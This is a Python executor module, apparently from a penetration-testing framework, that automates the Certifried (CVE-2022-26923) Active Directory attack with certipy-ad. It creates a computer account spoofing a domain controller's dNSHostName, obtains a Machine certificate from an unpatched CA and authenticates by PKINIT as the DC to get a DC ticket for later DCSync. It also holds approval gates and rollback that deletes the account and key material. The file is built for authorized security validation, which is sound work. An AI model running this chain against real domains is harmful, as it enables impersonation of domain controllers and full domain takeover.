"""Certifried (CVE-2022-26923) validation executor -- FULL (N1), synchronous.

Certifried abuses a machine-account's control over its own ``dNSHostName`` on an
UNPATCHED CA (no SID security extension, pre-May-2022): create a computer
(MachineAccountQuota>0), set its ``dNSHostName`` to a DC's, request a
Machine-template cert, and PKINIT as the DC. Synchronous (no listener), like
ADCS-ESC1:

    certipy-ad account create -user <new> -pass *** -dns <dc_fqdn>   (MUTATING; MAQ>0)
    certipy-ad req -u <new>$ -template Machine -ca <ca> -target <ca_host>  (issue pfx)
    certipy-ad auth -pfx <issued>.pfx -dc-ip <dc>                    (PKINIT as the DC)
    terminal ok  <=> a cert was issued AND PKINIT succeeded
    ROLLBACK (H2, non-vacuous positive confirmation): delete the created computer,
        then re-read via LDAP requiring BOTH a positive read-success marker (the
        bind actually succeeded -- the read RAN) AND the created computer ABSENT
        (mirror rbcd.py's read-back: header present AND principal absent); plus
        destroy the issued pfx (ESC1 ``removed>=1`` rule). mutating -> VERIFIED
        rollback required.

H1 -- scoring identity: the facet keys CERTIFRIED on the CA host
(``{host_id: srv03, domain: essos.local}``), the unpatched entity -- NOT the
impersonated DC. ``target_identity`` therefore emits the CA host (``ca_host``)
merged with the config domain (mirrors ADCS-ESC1). If this ever emitted the DC
host it would score ``not-proved`` (truth says the DC is not the Certifried-
vulnerable entity).

Capability-state metadata (toward C): ``pre={S0_USER_CREDS}``, ``eff={DC_TGT}``.
H3 -- composed rollback: standalone this deletes the created computer + destroys
the pfx immediately; as a composable FRONT by C it DEFERS to chain teardown (so
it does not destroy the ``.ccache``/``dc_tgt`` a downstream DCSync consumes). C
honours ``composable_rollback_defers``; N1 only declares it.

``verified_recipe=False`` (recipe-known, not lab-proven). The created-account
password / issued pfx / recovered NT hash / operator password are SECRETS: local
vars / masked argv only, never in the receipt. UNVERIFIED (pin in-lab): the
certipy account-create/req/auth/delete markers, the issued-pfx path, and the
``nxc ldap`` read-back bind-OK marker.
"""
from __future__ import annotations

import re
import secrets
from pathlib import Path
from typing import Any, Optional

from ..recommend import (ParamSpec, ParamValue, values,
                         validate_sam_name, sam_name_warning)
from .. import proof
from .. import states
from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                   redact_argv)
from .coercion import machine_account, _short_name


# ---- UNVERIFIED certipy / nxc output markers (see module docstring) -----------
_RE_ACCOUNT_CREATED = re.compile(
    r"(Successfully created account|Successfully added (machine|computer) account|"
    r"account created)", re.I)
_RE_ACCOUNT_DELETED = re.compile(
    r"(Successfully deleted account|Successfully deleted (machine|computer) account|"
    r"account deleted)", re.I)
_RE_REQ_ISSUED = re.compile(
    r"(Saved certificate and private key|Successfully requested certificate|"
    r"Got certificate with UPN)", re.I)
_RE_PFX_PATH = re.compile(
    r"Saved certificate and private key to ['\"]?([^'\"\s]+\.pfx)", re.I)
_RE_AUTH_OK = re.compile(r"(Got hash|authenticated|Got TGT)", re.I)
_RE_CCACHE = re.compile(
    r"Saved credential cache to ['\"]?([^'\"\s]+\.ccache)", re.I)
# nxc ldap bound/authenticated successfully (the read-back actually RAN). A
# transport-failed read lacks this, so an "absent" result is never vacuous.
_RE_LDAP_BIND_OK = re.compile(r"\bLDAP\b.*\[\+\]", re.I)


def certifried_computer(base: str) -> str:
    """Recommended new computer for a Certifried validation: ``<user>_cmp_certifried``."""
    return f"{base}_cmp_certifried"


class CertifriedExecutor(ValidationExecutor):
    technique = "CERTIFRIED"
    technique_class = "adcs"
    terminal_kind = "cert_issued_and_used"
    mutating = True
    verified_recipe = False
    # Capability-state metadata (toward C): a front from operator creds to a
    # DC-context TGT (PKINIT with the issued machine cert).
    pre = frozenset({states.S0_USER_CREDS})
    eff = frozenset({states.DC_TGT})
    # H3: per-edge rollback is standalone-only; composed, it defers to teardown.
    composable_rollback_defers = True
    recipe_ref = ("N1 CERTIFRIED (CVE-2022-26923) = certipy account create -dns "
                  "<dc_fqdn> (MAQ>0) ; certipy req -template Machine -ca <ca> "
                  "-target <ca_host> ; certipy auth -pfx (PKINIT as DC) ; ROLLBACK "
                  "delete computer + positive LDAP read-back + destroy pfx "
                  "(recipe-known, NOT lab-proven)")

    # ---------------------------------------------------------------- params
    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        entity = finding.entity or {}
        ca_host_default = entity.get("ca_host") or finding.host or ""
        base = ctx.config.principal_base
        return [
            ParamSpec(
                name="ca_host", kind="target_host",
                description="The CA host (certipy -target) -- the unpatched entity "
                            "the proof is keyed on (H1). Use its hostname.",
                recommended=ca_host_default,
                rationale="The host of the aranum AD CS finding (#66142).",
            ),
            ParamSpec(
                name="ca", kind="free",
                description="The issuing Certificate Authority name (certipy -ca).",
                recommended=entity.get("ca"),
                rationale="The AD CS CA aranum promoted; override per engagement.",
            ),
            ParamSpec(
                name="new_computer", kind="computer_name",
                description="New computer account to create; its dNSHostName is set "
                            "to the DC's (the CVE-2022-26923 spoof).",
                recommended=certifried_computer(base),   # <user>_cmp_certifried
                rationale="Derived from the supplied principal (mirrors the owner "
                          "worked example, #66142).",
                validator=validate_sam_name, advisory=sam_name_warning,
            ),
            ParamSpec(
                name="dc_fqdn", kind="target_host",
                description="The DC whose dNSHostName the created computer spoofs "
                            "(and is impersonated as via PKINIT). Operator-supplied.",
                recommended="",
                rationale="No safe default; the operator names the DC FQDN to spoof.",
                required=False,
            ),
        ]

    def target_identity(self, ctx, finding, params: dict[str, ParamValue]) -> dict[str, Any]:
        # H1: CERTIFRIED keys on the CA host {host_id, domain} (the unpatched
        # entity), NOT the impersonated DC -- mirror ADCS-ESC1.
        ca_host = (params["ca_host"].value if "ca_host" in params else None) \
            or (finding.entity or {}).get("ca_host") or finding.host or ""
        return {**ctx.config.resolve_target_identity(ca_host),
                "domain": ctx.config.domain}

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        dc = ctx.config.dc_ip
        return [
            f"certipy-ad account create -user {v['new_computer']} -pass *** "
            f"-dns {v.get('dc_fqdn') or '<dc_fqdn>'} -dc-ip {dc}  (MUTATING; MAQ>0)",
            f"certipy-ad req -u {v['new_computer']}$ -template Machine -ca {v['ca']} "
            f"-target {v['ca_host']}  (issue pfx)",
            f"certipy-ad auth -pfx *** -dc-ip {dc}  (PKINIT as the DC)",
            "ROLLBACK (MUTATING): certipy account delete + positive LDAP read-back "
            "(bind-ok AND computer absent) + destroy issued pfx",
        ]

    # ---------------------------------------------------------------- auth argv
    def _op_auth_argv(self, cfg) -> list[str]:
        """certipy operator-auth flags: ``-u op@dom`` + the secret flag (masked)."""
        argv = ["-u", f"{cfg.username or ''}@{cfg.domain}"]
        if cfg.nt_hash:
            argv += ["-hashes", cfg.nt_hash]
        elif cfg.aes_key:
            argv += ["-aesKey", cfg.aes_key]
        elif cfg.password is not None:
            argv += ["-p", cfg.password]
        return argv

    def _nxc_auth(self, cfg) -> list[str]:
        """NetExec operator-auth flags for the LDAP read-back (secrets masked)."""
        argv = ["-u", cfg.username or ""]
        if cfg.nt_hash:
            argv += ["-H", cfg.nt_hash]
        elif cfg.aes_key:
            argv += ["--aesKey", cfg.aes_key]
        elif cfg.password is not None:
            argv += ["-p", cfg.password]
        return argv

    # ---------------------------------------------------------------- execute
    def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
        cfg = ctx.config
        v = values(params)
        ca_host = v["ca_host"]
        ca = v["ca"]
        new = v["new_computer"]
        dc_fqdn = v.get("dc_fqdn") or ""
        new_pass = secrets.token_urlsafe(18)             # secret, never stored
        op_auth = self._op_auth_argv(cfg)
        dc = cfg.dc_ip
        out_dir = Path(ctx.output_dir)
        out_dir.mkdir(parents=True, exist_ok=True)

        steps: list[StepRecord] = []
        errors: list[str] = []
        gate = {"classifier": "not_required", "op": None}
        mutation = {"applied": False,
                    "rollback": {"performed": False, "method": None, "verified": False}}

        def record(name, argv, res, ok, note=""):
            steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                    returncode=res.returncode if res else None, note=note))

        # 1) create the controlled computer (MUTATING, gated; needs MAQ>0) ----
        verdict = ctx.authorizer.authorize(
            "certifried_account_create", {"computer": f"{new}$", "dns": dc_fqdn})
        if verdict == "denied":
            gate["classifier"] = "denied"
            gate["op"] = "certifried_account_create"
            errors.append("gate_denied:certifried_account_create")
            return self._artifact(steps, gate, mutation, None, False, errors)
        if verdict == "approved":
            gate["classifier"] = "approved"
            gate["op"] = "certifried_account_create"

        create_argv = ["certipy-ad", "account", "create", *op_auth, "-dc-ip", dc,
                       "-user", new, "-pass", new_pass, "-dns", dc_fqdn]
        res = ctx.runner.run(create_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        create_ok = bool(_RE_ACCOUNT_CREATED.search((res.stdout or "") + (res.stderr or "")))
        record("account_create", create_argv, res, create_ok,
               note="computer created" if create_ok else "create failed")
        if not create_ok:
            errors.append("account_create_failed")
            return self._artifact(steps, gate, mutation, None, False, errors)
        mutation["applied"] = True                       # a computer WAS created

        # 2) request a Machine-template cert on the (unpatched) CA ------------
        req_argv = ["certipy-ad", "req", "-u", f"{new}$@{cfg.domain}", "-p", new_pass,
                    "-dc-ip", dc, "-ca", ca, "-template", "Machine", "-target", ca_host]
        res = ctx.runner.run(req_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        req_out = (res.stdout or "") + (res.stderr or "")
        issued_ok = bool(_RE_REQ_ISSUED.search(req_out))
        pfx = self._parse_pfx(req_out, out_dir, new)     # secret path
        record("cert_request", req_argv, res, issued_ok,
               note="cert issued" if issued_ok else "request failed")
        if not issued_ok:
            errors.append("cert_request_failed")
            self._rollback(ctx, cfg, new, dc_fqdn, op_auth, mutation, steps, errors, pfx, None, record)
            return self._artifact(steps, gate, mutation, None, False, errors)

        # 3) PKINIT with the issued pfx -> authenticate AS the DC -------------
        auth_argv = ["certipy-ad", "auth", "-pfx", pfx, "-dc-ip", dc]
        res = ctx.runner.run(auth_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        auth_ran = True
        auth_out = (res.stdout or "") + (res.stderr or "")
        auth_ok = bool(_RE_AUTH_OK.search(auth_out))
        ccache = self._parse_ccache(auth_out, out_dir)
        record("cert_auth", auth_argv, res, auth_ok,
               note="pkinit ok" if auth_ok else "pkinit failed")
        if not auth_ok:
            errors.append("cert_auth_failed")

        impersonated = machine_account(dc_fqdn) or (f"{_short_name(dc_fqdn)}$" if dc_fqdn else "<dc>$")
        cert_used_ok = bool(issued_ok and auth_ok)
        terminal_fact = proof.build_terminal_fact(
            self.terminal_kind, ok=cert_used_ok, impersonated=impersonated,
            predicate=(f"created computer {new}$ with the dNSHostName of {dc_fqdn or '<dc>'} "
                       f"(MAQ>0), requested a Machine certificate on the unpatched CA {ca} "
                       f"({ca_host}), and used it for PKINIT as {impersonated} (CVE-2022-26923)"),
            proof_token=proof.proof_token("CERTIFRIED", cfg.domain, ca_host, ca, new,
                                          "certifried_pkinit"),
            extra={"ca_host": _short_name(ca_host), "ca": ca, "new_computer": f"{new}$"})

        # 4) rollback (ALWAYS, since we created a computer): delete + verify + destroy pfx.
        self._rollback(ctx, cfg, new, dc_fqdn, op_auth, mutation, steps, errors, pfx, ccache, record)
        if mutation["applied"]:
            errors.append(f"advisory:rotate_credentials:{impersonated}@{cfg.domain}")

        complete = bool(issued_ok and auth_ran and mutation["rollback"]["performed"])
        return self._artifact(steps, gate, mutation, terminal_fact, complete, errors)

    # ---------------------------------------------------------------- rollback
    def _rollback(self, ctx, cfg, new, dc_fqdn, op_auth, mutation, steps, errors,
                  pfx, ccache, record) -> None:
        """Delete the created computer, verify via a POSITIVE LDAP read-back (the
        bind succeeded AND the computer is absent -- never a vacuous empty query),
        and destroy the issued pfx key material (H2)."""
        if not mutation["applied"]:
            return
        dc = cfg.dc_ip
        if ctx.authorizer.authorize("rollback", {"computer": f"{new}$"}) == "denied":
            errors.append("gate_denied:rollback")
            return
        mutation["rollback"]["performed"] = True
        mutation["rollback"]["method"] = (
            "certipy account delete ; LDAP read-back (bind-ok AND computer absent) ; "
            "destroy issued pfx")

        del_argv = ["certipy-ad", "account", "delete", *op_auth, "-dc-ip", dc, "-user", new]
        res = ctx.runner.run(del_argv, timeout=cfg.tool_timeout_s)
        del_ok = bool(_RE_ACCOUNT_DELETED.search((res.stdout or "") + (res.stderr or "")))
        record("rollback_delete_computer", del_argv, res, del_ok)

        # Positive-confirmation read-back: query for the created computer OR a
        # control object (the DC's own account) so the read provably RAN; cleared
        # iff the bind succeeded AND the created computer no longer appears.
        dc_short = _short_name(dc_fqdn)
        read_filter = (f"(|(sAMAccountName={new}$)(sAMAccountName={dc_short}$))"
                       if dc_short else f"(sAMAccountName={new}$)")
        read_argv = ["nxc", "ldap", dc, *self._nxc_auth(cfg), "--query", read_filter,
                     "sAMAccountName"]
        res = ctx.runner.run(read_argv, timeout=cfg.tool_timeout_s)
        read_out = res.stdout or ""
        cleared = (bool(_RE_LDAP_BIND_OK.search(read_out))
                   and f"{new}$".lower() not in read_out.lower())
        record("rollback_verify_read", read_argv, res, cleared,
               note="computer absent (read confirmed)" if cleared else "deletion not confirmed")

        # Destroy the issued pfx key material; required only when a cert was issued.
        had_pfx = bool(pfx) and Path(pfx).exists()
        destroyed = self._destroy_key_material([pfx, ccache], steps)
        pfx_ok = destroyed or not had_pfx

        mutation["rollback"]["verified"] = bool(del_ok and cleared and pfx_ok)
        if not mutation["rollback"]["verified"]:
            errors.append("rollback_unverified")

    @staticmethod
    def _destroy_key_material(paths, steps) -> bool:
        """Delete each key-material file; True iff >=1 real artifact destroyed AND
        none remain (the ESC1 non-vacuous rule)."""
        targets = [Path(p) for p in paths if p]
        removed = 0
        for fp in targets:
            try:
                if fp.exists():
                    fp.unlink()
                    removed += 1
            except OSError:
                pass
        gone = all(not fp.exists() for fp in targets)
        verified = gone and removed >= 1
        steps.append(StepRecord(
            name="destroy_key_material", ok=verified, argv_display=[], returncode=None,
            note=(f"{removed} artifact(s) destroyed" if verified
                  else "key material not confirmed destroyed")))
        return verified

    # ---------------------------------------------------------------- helpers
    @staticmethod
    def _parse_pfx(stdout: str, out_dir: Path, new: str) -> str:
        """The issued pfx path (SECRET: masked in argv, never stored). Prefer the
        path certipy reports; fall back to ``<new>.pfx`` in the run dir."""
        m = _RE_PFX_PATH.search(stdout)
        if m:
            raw = m.group(1).strip()
            p = Path(raw)
            return str(p if p.is_absolute() else out_dir / p)
        return str(out_dir / f"{(new or 'cert').lower()}.pfx")

    @staticmethod
    def _parse_ccache(stdout: str, out_dir: Path) -> Optional[str]:
        m = _RE_CCACHE.search(stdout)
        if not m:
            return None
        raw = m.group(1).strip()
        p = Path(raw)
        return str(p if p.is_absolute() else out_dir / p)

    @staticmethod
    def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": mutation, "terminal_fact": terminal_fact,
                "complete": complete, "errors": errors}
